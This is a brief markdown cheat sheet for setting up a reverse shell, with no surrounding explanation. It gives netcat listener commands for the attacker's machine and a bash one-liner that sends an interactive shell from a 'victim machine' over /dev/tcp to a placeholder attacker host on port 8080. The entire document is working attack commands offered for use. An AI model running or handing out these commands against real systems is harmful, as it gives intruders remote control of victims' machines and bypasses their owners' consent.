# open listener port on attackers machine
* `nc -l -p 8080`
* macOS `nc -l localhost 8080`

# reverse connect from victim machine to attackers machine
`/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERS_MACHINE_HOST/8080 0>&1'`
  
